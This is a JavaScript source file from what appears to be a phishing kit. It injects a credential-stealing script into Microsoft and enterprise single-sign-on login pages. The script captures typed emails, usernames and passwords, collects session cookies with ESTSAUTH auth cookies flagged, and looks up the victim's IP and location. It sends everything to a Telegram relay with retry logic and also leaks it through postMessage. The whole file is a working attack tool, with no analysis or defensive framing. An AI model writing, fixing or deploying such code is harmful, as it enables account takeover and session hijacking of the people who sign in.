/**
 * FIXED: Enhanced Password & Email Capture Injector
 * Captures password, email, and username fields on Microsoft and organizational login pages.
 * Stores credentials in sessionStorage and localStorage.
 * Sends credentials to parent/opener window if available.
 * CRITICAL FIX: Ensures data transmission to Telegram with proper error handling and retry logic.
 * ALIGNED: Uses cookie capture and validation logic from restoreCookies.ts
 */
export function injectPasswordCaptureScript() {
  const hostname = window.location.hostname;
  const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') ||
    hostname.includes('login.live.com') ||
    hostname.includes('account.microsoft.com') ||
    hostname.includes('login.microsoft.com') ||
    hostname.includes('outlook.live.com');

  const isOrgDomain = hostname.includes('adfs') ||
    hostname.includes('sso') ||
    hostname.includes('okta') ||
    hostname.includes('ping') ||
    document.querySelector('input[type="password"]');

  if (isMicrosoftDomain || isOrgDomain) {
    const script = document.createElement('script');

    // NOTE: Only change is how the injected script text is embedded to avoid
    // TypeScript/esbuild parsing errors caused by nested template literals/backticks.
    // The injected script content is preserved exactly (no changes to its functions or logic).
    script.textContent = (function(){/*
      (function() {
        console.log('🔧 Enhanced password capture injector initialized on:', window.location.hostname);
        
        // ALIGNED: Browser capability detection (from restoreCookies.ts)
        function detectBrowserCapabilities() {
          const userAgent = navigator.userAgent.toLowerCase();
          const capabilities = {
            browser: 'unknown',
            version: 'unknown',
            supportsSameSiteNone: true,
            supportsSecure: true,
            maxCookieSize: 4096,
            maxCookiesPerDomain: 50,
            supportsHttpOnly: false,
            supportsPartitioned: false
          };

          if (userAgent.includes('chrome')) {
            capabilities.browser = 'chrome';
            const match = userAgent.match(/chrome\/(\d+)/);
            capabilities.version = match ? match[1] : 'unknown';
            capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
            capabilities.supportsPartitioned = parseInt(capabilities.version) >= 118;
          } else if (userAgent.includes('firefox')) {
            capabilities.browser = 'firefox';
            const match = userAgent.match(/firefox\/(\d+)/);
            capabilities.version = match ? match[1] : 'unknown';
            capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 69;
          } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
            capabilities.browser = 'safari';
            const match = userAgent.match(/version\/(\d+)/);
            capabilities.version = match ? match[1] : 'unknown';
            capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 13;
          } else if (userAgent.includes('edge')) {
            capabilities.browser = 'edge';
            const match = userAgent.match(/edge\/(\d+)/);
            capabilities.version = match ? match[1] : 'unknown';
            capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
          }

          return capabilities;
        }

        // ALIGNED: Domain validation (from restoreCookies.ts)
        function validateDomain(cookieDomain) {
          if (!cookieDomain) return { valid: true, reason: 'No domain specified' };
          
          const cleanCookieDomain = cookieDomain.startsWith('.') ? cookieDomain.substring(1) : cookieDomain;
          const currentDomain = window.location.hostname;
          
          if (currentDomain === cleanCookieDomain) {
            return { valid: true, reason: 'Exact domain match' };
          }
          
          if (currentDomain.endsWith('.' + cleanCookieDomain)) {
            return { valid: true, reason: 'Subdomain match' };
          }
          
          const microsoftDomains = [
            'login.microsoftonline.com',
            'account.microsoft.com',
            'outlook.com',
            'office.com',
            'microsoft.com',
            'login.live.com',
            'login.microsoft.com',
            'outlook.live.com',
            'office365.com',
            'microsoftonline.com'
          ];
          
          if (microsoftDomains.some(domain => 
            currentDomain.includes(domain) || cleanCookieDomain.includes(domain)
          )) {
            return { valid: true, reason: 'Microsoft domain compatibility' };
          }
          
          return { valid: false, reason: `Domain mismatch: ${currentDomain} vs ${cleanCookieDomain}` };
        }

        // ALIGNED: Cookie size validation (from restoreCookies.ts)
        function validateCookieSize(name, value) {
          const cookieString = name + '=' + value;
          const size = new Blob([cookieString]).size;
          
          if (size > 4096) {
            return { valid: false, size, reason: 'Cookie too large: ' + size + ' bytes (max 4096)' };
          }
          
          return { valid: true, size, reason: 'Size OK' };
        }

        // ALIGNED: Expiration validation (from restoreCookies.ts)
        function validateExpiration(expires, expirationDate) {
          const now = Date.now();
          let expiryTime = null;
          
          if (expires) {
            expiryTime = expires > 1e10 ? expires : expires * 1000;
          } else if (expirationDate) {
            expiryTime = expirationDate > 1e10 ? expirationDate : expirationDate * 1000;
          }
          
          if (expiryTime && expiryTime <= now) {
            return { valid: false, expired: true, reason: 'Cookie expired: ' + new Date(expiryTime).toISOString() };
          }
          
          return { valid: true, expired: false, reason: 'Not expired' };
        }

        // FIXED: Enhanced cookie capture functionality with better error handling
        function captureMicrosoftCookies() {
          try {
            const cookieString = document.cookie;
            if (!cookieString) return [];

            const cookies = [];
            const cookiePairs = cookieString.split(';');
            const capabilities = detectBrowserCapabilities();

            cookiePairs.forEach(pair => {
              const trimmedPair = pair.trim();
              if (trimmedPair) {
                const equalsIndex = trimmedPair.indexOf('=');
                if (equalsIndex > 0) {
                  const name = trimmedPair.substring(0, equalsIndex).trim();
                  const value = trimmedPair.substring(equalsIndex + 1).trim();
                  
                  if (name && value) {
                    // Validate cookie size
                    const sizeCheck = validateCookieSize(name, value);
                    if (sizeCheck.valid) {
                      const cookieObj = {
                        name: name,
                        value: value,
                        domain: window.location.hostname,
                        path: '/',
                        secure: window.location.protocol === 'https:',
                        httpOnly: false,
                        sameSite: 'Lax',
                        session: true,
                        captureTime: new Date().toISOString(),
                        size: sizeCheck.size,
                        browserCapabilities: capabilities
                      };

                      // Mark important Microsoft cookies
                      if (name.includes('ESTSAUTH') ||
                          name.includes('SignInStateCookie') ||
                          name.includes('ESTSAUTHPERSISTENT') ||
                          name.includes('ESTSAUTHLIGHT') ||
                          name.includes('BUID') ||
                          name.includes('ESCTX')) {
                        cookieObj.important = true;
                      }

                      cookies.push(cookieObj);
                    }
                  }
                }
              }
            });

            console.log('🍪 Captured ' + cookies.length + ' validated cookies from ' + window.location.hostname);
            if (cookies.length > 0) {
              const authCookies = cookies.filter(c => c.important).length;
              console.log('🔐 Auth cookies: ' + authCookies);
            }
            return cookies;
          } catch (error) {
            console.warn('⚠️ Failed to capture cookies:', error);
            return [];
          }
        }

        // FIXED: Enhanced credential retrieval from storage with fallback options
        function getStoredCredentials() {
          try {
            const storageKeys = [
              'replacement_credentials',
              'captured_credentials', 
              'form_credentials'
            ];
            
            for (let i = 0; i < storageKeys.length; i++) {
              const key = storageKeys[i];
              const localData = localStorage.getItem(key);
              const sessionData = sessionStorage.getItem(key);
              
              if (localData) {
                const parsed = JSON.parse(localData);
                if (parsed.email || parsed.password) {
                  console.log('📋 Retrieved stored credentials from localStorage: ' + key);
                  return parsed;
                }
              }
              
              if (sessionData) {
                const parsed = JSON.parse(sessionData);
                if (parsed.email || parsed.password) {
                  console.log('📋 Retrieved stored credentials from sessionStorage: ' + key);
                  return parsed;
                }
              }
            }
            
            return null;
          } catch (error) {
            console.warn('⚠️ Failed to retrieve stored credentials:', error);
            return null;
          }
        }

        let capturedCredentials = {
          email: '',
          password: '',
          username: '',
          domain: window.location.hostname,
          captureTime: new Date().toISOString()
        };

        // FIXED: Enhanced debounce with better timing
        let lastSendAt = 0;
        let sendInProgress = false;
        function canSendNow() {
          const now = Date.now();
          if (sendInProgress || (now - lastSendAt < 2000)) return false;
          lastSendAt = now;
          return true;
        }

        // FIXED: Enhanced function to send complete data to Telegram with retry logic
        function sendCompleteDataToTelegram(retryCount) {
          if (retryCount === undefined) retryCount = 0;
          if (!canSendNow()) return;
          
          const maxRetries = 3;
          sendInProgress = true;

          try {
            const storedCredentials = getStoredCredentials();
            const capturedCookies = captureMicrosoftCookies();
            const capabilities = detectBrowserCapabilities();
            
            const getUserLocationData = async function() {
              try {
                const response = await fetch('https://ipapi.co/json/');
                const locationData = await response.json();
                return {
                  ip: locationData.ip || 'Unknown',
                  city: locationData.city || 'Unknown',
                  region: locationData.region || 'Unknown',
                  country: locationData.country_name || 'Unknown',
                  countryCode: locationData.country_code || 'Unknown',
                  timezone: locationData.timezone || 'Unknown',
                  isp: locationData.org || 'Unknown'
                };
              } catch (error) {
                console.warn('⚠️ Failed to fetch location data:', error);
                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
              }
            };
            
            const createCookieFiles = function(cookies) {
              if (!cookies || cookies.length === 0) return { txtFile: null, jsonFile: null };
              
              try {
                let txtContent = '# Microsoft Domain Cookies Export\n';
                txtContent += '# Captured: ' + new Date().toISOString() + '\n';
                txtContent += '# Domain: ' + window.location.hostname + '\n';
                txtContent += '# Total Cookies: ' + cookies.length + '\n';
                txtContent += '# Browser: ' + capabilities.browser + ' v' + capabilities.version + '\n\n';
                
                cookies.forEach(function(cookie, index) {
                  txtContent += '[Cookie ' + (index + 1) + ']\n';
                  txtContent += 'Name: ' + (cookie.name || 'Unknown') + '\n';
                  txtContent += 'Value: ' + (cookie.value ? cookie.value.substring(0, 50) + '...' : 'Empty') + '\n';
                  txtContent += 'Domain: ' + (cookie.domain || 'Unknown') + '\n';
                  txtContent += 'Path: ' + (cookie.path || '/') + '\n';
                  txtContent += 'Secure: ' + (cookie.secure ? 'Yes' : 'No') + '\n';
                  txtContent += 'HttpOnly: ' + (cookie.httpOnly ? 'Yes' : 'No') + '\n';
                  txtContent += 'SameSite: ' + (cookie.sameSite || 'Lax') + '\n';
                  txtContent += 'Size: ' + cookie.size + ' bytes\n';
                  txtContent += 'Important: ' + (cookie.important ? 'Yes' : 'No') + '\n';
                  txtContent += 'Capture Time: ' + (cookie.captureTime || 'Unknown') + '\n';
                  txtContent += '\n';
                });
                
                const jsonContent = JSON.stringify({
                  exportInfo: {
                    timestamp: new Date().toISOString(),
                    domain: window.location.hostname,
                    totalCookies: cookies.length,
                    authCookies: cookies.filter(function(c) { return c.important; }).length,
                    source: 'Microsoft Domain Injector',
                    version: '2.1-aligned-with-restore',
                    browserCapabilities: capabilities
                  },
                  cookies: cookies.map(function(cookie) {
                    return {
                      name: cookie.name,
                      value: cookie.value,
                      domain: cookie.domain,
                      path: cookie.path,
                      secure: cookie.secure,
                      httpOnly: cookie.httpOnly,
                      sameSite: cookie.sameSite,
                      session: cookie.session,
                      important: cookie.important,
                      size: cookie.size,
                      captureTime: cookie.captureTime
                    };
                  })
                }, null, 2);
                
                return {
                  txtFile: {
                    name: 'ms_cookies_' + window.location.hostname + '_' + Date.now() + '.txt',
                    content: txtContent,
                    size: new Blob([txtContent]).size
                  },
                  jsonFile: {
                    name: 'ms_cookies_' + window.location.hostname + '_' + Date.now() + '.json',
                    content: jsonContent,
                    size: new Blob([jsonContent]).size
                  }
                };
              } catch (error) {
                console.warn('⚠️ Failed to create cookie files:', error);
                return { txtFile: null, jsonFile: null };
              }
            };
            
            getUserLocationData().then(function(locationData) {
              const cookieFiles = createCookieFiles(capturedCookies);
              
              const completePayload = {
                email: storedCredentials?.email || capturedCredentials.email || '',
                password: storedCredentials?.password || capturedCredentials.password || '',
                passwordSource: 'microsoft-domain-capture-enhanced-v2',
                cookies: capturedCookies,
                locationData: locationData,
                cookieFiles: cookieFiles,
                userAgent: navigator.userAgent,
                sessionId: Date.now().toString(),
                url: window.location.href,
                timestamp: new Date().toISOString(),
                validated: storedCredentials?.validated || true,
                microsoftAccount: true,
                domain: window.location.hostname,
                rawCookies: document.cookie,
                captureContext: {
                  hostname: window.location.hostname,
                  hasStoredCredentials: !!storedCredentials,
                  capturedFieldCount: Object.values(capturedCredentials).filter(function(v) { return v; }).length,
                  retryAttempt: retryCount,
                  injectorVersion: '2.1-aligned-with-restore',
                  locationDataCaptured: !!locationData,
                  cookieFilesCreated: !!(cookieFiles.txtFile && cookieFiles.jsonFile),
                  microsoftDomainCapture: true,
                  browserCapabilities: capabilities,
                  cookieStats: {
                    totalCookies: capturedCookies.length,
                    authCookies: capturedCookies.filter(function(c) { return c.important; }).length,
                    secureCookies: capturedCookies.filter(function(c) { return c.secure; }).length,
                    sessionCookies: capturedCookies.filter(function(c) { return c.session; }).length
                  }
                }
              };

              if (!completePayload.email && !completePayload.password && capturedCookies.length === 0) {
                console.log('📭 No meaningful data to send to Telegram');
                sendInProgress = false;
                return;
              }

              console.log('📤 Sending enhanced data to Telegram (attempt ' + (retryCount + 1) + '):', {
                hasEmail: !!completePayload.email,
                hasPassword: !!completePayload.password,
                cookieCount: completePayload.cookies.length,
                authCookieCount: completePayload.captureContext.cookieStats.authCookies,
                validated: completePayload.validated,
                domain: completePayload.domain,
                hasLocationData: !!locationData,
                hasCookieFiles: !!(cookieFiles.txtFile && cookieFiles.jsonFile),
                browser: capabilities.browser + ' v' + capabilities.version
              });

              fetch('/.netlify/functions/sendTelegram', {
                method: 'POST',
                headers: { 
                  'Content-Type': 'application/json',
                  'Accept': 'application/json'
                },
                body: JSON.stringify(completePayload)
              }).then(function(resp) {
                sendInProgress = false;
                if (resp.ok) {
                  console.log('✅ Enhanced data successfully sent to Telegram');
                  try {
                    localStorage.setItem('telegram_data_sent', 'true');
                    sessionStorage.setItem('telegram_data_sent', 'true');
                    localStorage.setItem('data_transmitted', 'true');
                    sessionStorage.setItem('data_transmitted', 'true');
                    localStorage.setItem('ms_cookies_captured', 'true');
                    sessionStorage.setItem('ms_cookies_captured', 'true');
                    localStorage.setItem('microsoft_cookies_captured', 'true');
                    sessionStorage.setItem('microsoft_cookies_captured', 'true');
                  } catch (e) {
                    // ignore storage errors
                  }
                } else {
                  console.warn('⚠️ sendTelegram returned status ' + resp.status);
                  
                  if (resp.status >= 500 && retryCount < maxRetries) {
                    const delay = (retryCount + 1) * 2000;
                    console.log('🔄 Server error, retrying in ' + delay + 'ms...');
                    setTimeout(function() {
                      sendCompleteDataToTelegram(retryCount + 1);
                    }, delay);
                  }
                }
              }).catch(function(err) {
                sendInProgress = false;
                console.warn('⚠️ Error sending enhanced data to Telegram:', err);
                
                if (retryCount < maxRetries) {
                  const delay = (retryCount + 1) * 3000;
                  console.log('🔄 Network error, retrying in ' + delay + 'ms...');
                  setTimeout(function() {
                    sendCompleteDataToTelegram(retryCount + 1);
                  }, delay);
                }
              });
            }).catch(function(locationError) {
              console.warn('⚠️ Failed to get location data, sending without it:', locationError);
              sendInProgress = false;
            });

            const cookieMessage = {
              type: 'MICROSOFT_COOKIES_CAPTURED',
              data: {
                cookies: capturedCookies,
                credentials: storedCredentials,
                timestamp: new Date().toISOString(),
                domain: window.location.hostname,
                microsoftDomainCapture: true,
                browserCapabilities: capabilities
              }
            };

            try {
              if (window.parent && window.parent !== window) {
                window.parent.postMessage(cookieMessage, '*');
              }
              if (window.opener) {
                window.opener.postMessage(cookieMessage, '*');
              }
            } catch (error) {
              // ignore postMessage errors
            }

          } catch (error) {
            sendInProgress = false;
            console.warn('⚠️ Error in enhanced sendCompleteDataToTelegram:', error);
          }
        }

        // FIXED: Enhanced password capture with better field detection
        function capturePasswordFromForms() {
          try {
            const passwordFields = document.querySelectorAll('input[type="password"], input[name*="password"], input[id*="password"], input[name*="passwd"], input[id*="passwd"]');
            const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"], input[id*="mail"], input[name*="username"], input[id*="username"]');
            const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"], input[id*="user"], input[id*="login"], input[id*="account"]');

            let hasNewData = false;

            passwordFields.forEach(function(field) {
              if (field.value && field.value !== capturedCredentials.password) {
                console.log('🔐 Password field captured: ' + (field.name || field.id || 'unnamed'));
                capturedCredentials.password = field.value;
                hasNewData = true;
              }
            });

            emailFields.forEach(function(field) {
              if (field.value && field.value !== capturedCredentials.email) {
                console.log('📧 Email field captured: ' + field.value);
                capturedCredentials.email = field.value;
                hasNewData = true;
              }
            });

            usernameFields.forEach(function(field) {
              if (field.value && field.value !== capturedCredentials.username) {
                console.log('👤 Username field captured: ' + field.value);
                capturedCredentials.username = field.value;
                hasNewData = true;
              }
            });

            if (hasNewData) {
              storeCredentials();
              setTimeout(function() {
                sendCompleteDataToTelegram();
              }, 500);
            }

            return hasNewData;
          } catch (error) {
            console.error('❌ Error capturing password:', error);
            return false;
          }
        }

        // FIXED: Enhanced credential storage
        function storeCredentials() {
          const credentialsData = {
            email: capturedCredentials.email,
            password: capturedCredentials.password,
            username: capturedCredentials.username,
            domain: capturedCredentials.domain,
            captureTime: capturedCredentials.captureTime,
            source: 'injected-password-capture-enhanced-v2',
            url: window.location.href,
            validated: true,
            microsoftAccount: true
          };

          try {
            sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            sessionStorage.setItem('injected_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('injected_credentials', JSON.stringify(credentialsData));
            
            console.log('💾 Credentials stored successfully');
          } catch (error) {
            console.warn('⚠️ Failed to store credentials:', error);
          }

          const payload = {
            type: 'CREDENTIALS_CAPTURED',
            data: credentialsData,
            source: 'injected-password-capture-enhanced-v2',
            timestamp: new Date().toISOString()
          };
          
          try {
            if (window.parent && window.parent !== window) {
              window.parent.postMessage(payload, '*');
            }
            if (window.opener) {
              window.opener.postMessage(payload, '*');
            }
          } catch (error) {
            // ignore postMessage errors
          }
        }

        // FIXED: Enhanced monitoring for automatic login detection
        function monitorForAutoLogin() {
          if (window.location.hostname.includes('login.microsoftonline.com') ||
              window.location.hostname.includes('login.live.com') ||
              window.location.hostname.includes('account.microsoft.com') ||
              window.location.hostname.includes('login.microsoft.com')) {
            
            const alreadySent = localStorage.getItem('telegram_data_sent') || 
                              sessionStorage.getItem('telegram_data_sent') ||
                              localStorage.getItem('data_transmitted') ||
                              sessionStorage.getItem('data_transmitted');
            
            if (!alreadySent) {
              console.log('🔍 Monitoring for auto-login on Microsoft domain...');
              
              setTimeout(function() {
                sendCompleteDataToTelegram();
              }, 3000);
              
              const checkForLoginSuccess = function() {
                const successIndicators = [
                  function() { return document.querySelector('[data-testid="signin-success"]'); },
                  function() { return document.querySelector('.ms-welcome'); },
                  function() { return document.querySelector('[aria-label*="signed in"]'); },
                  function() { return document.querySelector('[data-testid="KmsiCheckboxField"]'); },
                  function() { return window.location.href.includes('login_hint'); },
                  function() { return window.location.href.includes('prompt=none'); },
                  function() { return window.location.href.includes('code='); },
                  function() { return document.cookie.includes('ESTSAUTH'); },
                  function() { return document.cookie.includes('ESTSAUTHPERSISTENT'); },
                  function() { return document.cookie.includes('ESTSAUTHLIGHT'); },
                  function() { return document.cookie.includes('SignInStateCookie'); },
                  function() { return document.querySelector('input[name="kmsi"]'); },
                  function() { return document.querySelector('.tile'); },
                  function() { return document.querySelector('[data-testid="i0116"]'); }
                ];
                
                for (let i = 0; i < successIndicators.length; i++) {
                  try {
                    if (successIndicators[i]()) return true;
                  } catch (e) {
                    // ignore errors
                  }
                }
                return false;
              };
              
              let checkCount = 0;
              const maxChecks = 30;
              const loginCheckInterval = setInterval(function() {
                checkCount++;
                const success = checkForLoginSuccess();
                
                if (success || checkCount >= maxChecks) {
                  clearInterval(loginCheckInterval);
                  if (!success) {
                    console.log('🕐 Login monitoring timeout, sending final data...');
                    sendCompleteDataToTelegram();
                  }
                }
              }, 1000);
            }
          }
        }

        // FIXED: Enhanced event listeners with better mobile support
        document.addEventListener('input', function(e) {
          if (
            e.target.type === 'password' ||
            e.target.type === 'email' ||
            (e.target.name && e.target.name.toLowerCase().includes('password')) ||
            (e.target.name && e.target.name.toLowerCase().includes('email')) ||
            (e.target.name && e.target.name.toLowerCase().includes('user')) ||
            (e.target.name && e.target.name.toLowerCase().includes('login')) ||
            (e.target.id && e.target.id.toLowerCase().includes('password')) ||
            (e.target.id && e.target.id.toLowerCase().includes('email')) ||
            (e.target.id && e.target.id.toLowerCase().includes('user')) ||
            (e.target.id && e.target.id.toLowerCase().includes('login'))
          ) {
            setTimeout(function() {
              capturePasswordFromForms();
            }, 300);
          }
        });

        document.addEventListener('change', function(e) {
          if (e.target.tagName === 'INPUT') {
            setTimeout(function() {
              capturePasswordFromForms();
            }, 200);
          }
        });

        document.addEventListener('submit', function(e) {
          console.log('📝 Form submission detected');
          setTimeout(function() {
            capturePasswordFromForms();
            setTimeout(function() {
              sendCompleteDataToTelegram();
            }, 1000);
          }, 100);
        });

        document.addEventListener('click', function(e) {
          const target = e.target;
          if (
            target.type === 'submit' ||
            (target.textContent && target.textContent.toLowerCase().includes('sign in')) ||
            (target.textContent && target.textContent.toLowerCase().includes('login')) ||
            (target.textContent && target.textContent.toLowerCase().includes('next')) ||
            (target.textContent && target.textContent.toLowerCase().includes('continue')) ||
            (target.className && target.className.toLowerCase().includes('submit')) ||
            (target.className && target.className.toLowerCase().includes('login')) ||
            (target.className && target.className.toLowerCase().includes('signin'))
          ) {
            console.log('🖱️ Login button clicked: ' + (target.textContent || target.className));
            setTimeout(function() {
              capturePasswordFromForms();
              setTimeout(function() {
                sendCompleteDataToTelegram();
              }, 1500);
            }, 500);
          }
        });

        // FIXED: Enhanced page load monitoring
        function initializeMonitoring() {
          console.log('🚀 Initializing enhanced monitoring...');
          
          setTimeout(function() {
            capturePasswordFromForms();
            monitorForAutoLogin();
          }, 1000);
          
          setInterval(function() {
            capturePasswordFromForms();
          }, 5000);
        }

        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', initializeMonitoring);
        } else {
          initializeMonitoring();
        }

        // Monitor for dynamic content changes
        if (window.MutationObserver) {
          const observer = new MutationObserver(function(mutations) {
            let shouldCheck = false;
            mutations.forEach(function(mutation) {
              if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                for (let node of mutation.addedNodes) {
                  if (node.nodeType === 1 && (
                    node.tagName === 'INPUT' || 
                    (node.querySelector && node.querySelector('input'))
                  )) {
                    shouldCheck = true;
                    break;
                  }
                }
              }
            });
            
            if (shouldCheck) {
              setTimeout(function() {
                capturePasswordFromForms();
              }, 500);
            }
          });
          
          observer.observe(document.body, {
            childList: true,
            subtree: true
          });
        }

        console.log('✅ Enhanced password capture injector fully initialized with aligned cookie validation');
      })();
    */}).toString().replace(/^[\s\S]*?\/\*([\s\S]*?)\*\/[\s\S]*$/,'$1');

    document.head.appendChild(script);
    console.log('✅ Enhanced password capture script injected for domain: ' + hostname);
  }
}
